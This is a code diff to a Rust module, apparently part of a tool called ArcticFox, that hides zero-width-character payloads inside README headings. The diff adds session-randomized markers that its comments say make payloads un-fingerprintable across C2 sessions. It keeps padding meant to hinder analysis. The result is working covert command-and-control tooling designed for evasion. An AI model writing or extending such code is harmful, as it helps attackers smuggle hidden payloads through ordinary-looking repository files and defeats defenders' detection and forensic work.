@@ -8,10 +8,14 @@
 //!   U+200C  Zero Width Non-Joiner  = 1
 //!   U+200D  Zero Width Joiner      = 2
 //!   U+FEFF  Zero Width No-Break Sp = 3
+//!
+//! Markers are randomized per session via a seed derived from the session key
+//! to prevent static fingerprinting.
 
 use rand::Rng;
 use std::collections::HashMap;
 
+use crate::crypto::sha256_hex;
 use crate::error::{ArcticFoxError, Result};
 
 // ── Constants ───────────────────────────────────────────────────────────────
@@ -19,17 +23,14 @@ use crate::error::{ArcticFoxError, Result};
 /// The four zero-width characters used in encoding.
 pub const ZW_CHARS: [char; 4] = ['\u{200B}', '\u{200C}', '\u{200D}', '\u{FEFF}'];
 
-/// Start marker: 8 ZW chars marking payload start.
-const START_MARKER: &str = "\u{200B}\u{200B}\u{200C}\u{200C}\u{200D}\u{200D}\u{FEFF}\u{FEFF}";
-
-/// End marker: 8 ZW chars marking payload end.
-const END_MARKER: &str = "\u{FEFF}\u{FEFF}\u{200D}\u{200D}\u{200C}\u{200C}\u{200B}\u{200B}";
-
 /// Target padding size in bytes (≈1 MB of ZW chars).
 pub const ZW_PAD_TARGET: usize = 1_048_576;
 
 /// Number of ZW chars per encoded byte.
 const ZW_PER_BYTE: usize = 4;
+
+/// Default marker length in ZW chars.
+pub const MARKER_LEN: usize = 8;
 
 /// All ZW characters as a set for fast lookup.
 lazy_static::lazy_static! {
@@ -37,6 +38,56 @@ lazy_static::lazy_static! {
     static ref ZW_MAP: HashMap<char, u8> = ZW_CHARS.iter().enumerate()
         .map(|(i, &c)| (c, i as u8))
         .collect();
+}
+
+// ── Session Markers ──────────────────────────────────────────────────────────
+
+/// Session-specific ZW markers derived from a key/seed.
+///
+/// Unlike the old static markers, these are randomized per session
+/// using a seed derived from the crypto key, making payloads
+/// un-fingerprintable between different C2 sessions.
+#[derive(Debug, Clone)]
+pub struct SessionMarkers {
+    pub start: String,
+    pub end: String,
+}
+
+impl SessionMarkers {
+    /// Generate random session markers.
+    pub fn random() -> Self {
+        let seed: u64 = rand::random();
+        Self::from_seed(seed)
+    }
+
+    /// Derive deterministic markers from a seed.
+    pub fn from_seed(seed: u64) -> Self {
+        let mut rng: rand::rngs::StdRng = rand::SeedableRng::seed_from_u64(seed);
+        let start: String = (0..MARKER_LEN)
+            .map(|_| ZW_CHARS[rng.gen_range(0..4)])
+            .collect();
+        // End marker is reverse of start to maintain self-synchronization
+        let end: String = start.chars().rev().collect();
+        SessionMarkers { start, end }
+    }
+
+    /// Derive deterministic markers from a session key.
+    pub fn from_key(key: &[u8; 32]) -> Self {
+        let hash = sha256_hex(key);
+        // Take first 16 hex chars → parse as u64 seed
+        let seed = u64::from_str_radix(&hash[..16], 16).expect("SHA-256 output is always valid hex");
+        Self::from_seed(seed)
+    }
+}
+
+impl Default for SessionMarkers {
+    fn default() -> Self {
+        // Original static markers for backward compatibility
+        SessionMarkers {
+            start: "\u{200B}\u{200B}\u{200C}\u{200C}\u{200D}\u{200D}\u{FEFF}\u{FEFF}".into(),
+            end: "\u{FEFF}\u{FEFF}\u{200D}\u{200D}\u{200C}\u{200C}\u{200B}\u{200B}".into(),
+        }
+    }
 }
 
 // ── Public API ──────────────────────────────────────────────────────────────
@@ -123,38 +174,34 @@ pub fn gen_padding(target_bytes: usize) -> String {
     out
 }
 
-/// Inject a ZW-encoded payload into a README (or any markdown text).
+/// Inject a ZW-encoded payload using session-specific markers.
 ///
 /// Strips any existing ZW characters from the input, then inserts the
-/// encoded payload (with start/end markers) into the first line starting
-/// with `#`. If no heading is found, appends to the last line.
+/// encoded payload (with session markers) into the first line starting
+/// with `#`. If no heading is found, appends to the end.
 ///
-/// When `pad` is true, appends ~1MB of random ZW noise after the end marker
-/// to make extraction computationally expensive and hinder analysis.
-pub fn inject(readme: &str, payload: &[u8], pad: bool) -> Result<String> {
+/// When `pad` is true, appends ~1MB of random ZW noise after the end marker.
+pub fn inject_with_markers(readme: &str, payload: &[u8], pad: bool, markers: &SessionMarkers) -> Result<String> {
     let clean = strip(readme);
     let mut blob = String::with_capacity(
-        START_MARKER.len() + payload.len() * ZW_PER_BYTE + END_MARKER.len(),
+        markers.start.len() + payload.len() * ZW_PER_BYTE + markers.end.len(),
     );
-    blob.push_str(START_MARKER);
+    blob.push_str(&markers.start);
     blob.push_str(&encode(payload));
-    blob.push_str(END_MARKER);
+    blob.push_str(&markers.end);
 
     if pad {
         blob.push_str(&gen_padding(ZW_PAD_TARGET));
     }
 
-    let mut lines: Vec<&str> = clean.lines().collect();
+    let lines: Vec<&str> = clean.lines().collect();
     if lines.is_empty() {
         return Ok(blob);
     }
 
-    // Find first heading line
     let heading_idx = lines.iter().position(|line| line.starts_with('#'));
     match heading_idx {
         Some(idx) => {
-            lines[idx] = &lines[idx];
-            // We need to rebuild the string with the injection
             let mut result = String::with_capacity(clean.len() + blob.len());
             for (i, line) in lines.iter().enumerate() {
                 if i > 0 {
@@ -168,14 +215,25 @@ pub fn inject(readme: &str, payload: &[u8], pad: bool) -> Result<String> {
             Ok(result)
         }
         None => {
-            // No heading — append to last line or create new
-            if let Some(last) = lines.last_mut() {
-                Ok(format!("{}\n{}{}", clean.trim_end(), *last, blob))
-            } else {
+            if lines.is_empty() {
                 Ok(blob)
+            } else {
+                Ok(format!("{}{}", clean, blob))
             }
         }
     }
+}
+
+/// Inject a ZW-encoded payload into a README using default markers.
+///
+/// Strips any existing ZW characters from the input, then inserts the
+/// encoded payload (with start/end markers) into the first line starting
+/// with `#`. If no heading is found, appends to the last line.
+///
+/// When `pad` is true, appends ~1MB of random ZW noise after the end marker
+/// to make extraction computationally expensive and hinder analysis.
+pub fn inject(readme: &str, payload: &[u8], pad: bool) -> Result<String> {
+    inject_with_markers(readme, payload, pad, &SessionMarkers::default())
 }
 
 /// Strip all zero-width characters from a string.
@@ -185,7 +243,20 @@ pub fn strip(text: &str) -> String {
     text.chars().filter(|c| !ZW_SET.contains(c)).collect()
 }
 
-/// Extract and decode a ZW payload from text.
+/// Extract and decode a ZW payload from text using session markers.
+///
+/// Looks for the start and end markers, extracts everything between them,
+/// and decodes the ZW characters into bytes.
+///
+/// Returns `None` if no valid payload is found.
+pub fn extract_with_markers(text: &str, markers: &SessionMarkers) -> Option<Vec<u8>> {
+    let start = text.find(&markers.start)?;
+    let end = text[start + markers.start.len()..].find(&markers.end)?;
+    let encoded = &text[start + markers.start.len()..start + markers.start.len() + end];
+    decode(encoded).ok()
+}
+
+/// Extract and decode a ZW payload from text using default markers.
 ///
 /// Looks for the start and end markers, extracts everything between them,
 /// and decodes the ZW characters into bytes.
@@ -193,15 +264,17 @@ pub fn strip(text: &str) -> String {
 /// Returns `None` if no valid payload is found (start/end markers missing
 /// or payload cannot be decoded).
 pub fn extract(text: &str) -> Option<Vec<u8>> {
-    let start = text.find(START_MARKER)?;
-    let end = text[start + START_MARKER.len()..].find(END_MARKER)?;
-    let encoded = &text[start + START_MARKER.len()..start + START_MARKER.len() + end];
-    decode(encoded).ok()
+    extract_with_markers(text, &SessionMarkers::default())
 }
 
-/// Check if a string contains any ZW payload markers.
+/// Check if a string contains any ZW payload markers using session markers.
+pub fn contains_payload_with_markers(text: &str, markers: &SessionMarkers) -> bool {
+    text.contains(&markers.start) && text.contains(&markers.end)
+}
+
+/// Check if a string contains any ZW payload markers (default markers).
 pub fn contains_payload(text: &str) -> bool {
-    text.contains(START_MARKER) && text.contains(END_MARKER)
+    contains_payload_with_markers(text, &SessionMarkers::default())
 }
 
 // ── Tests ──────────────────────────────────────────────────────────────────
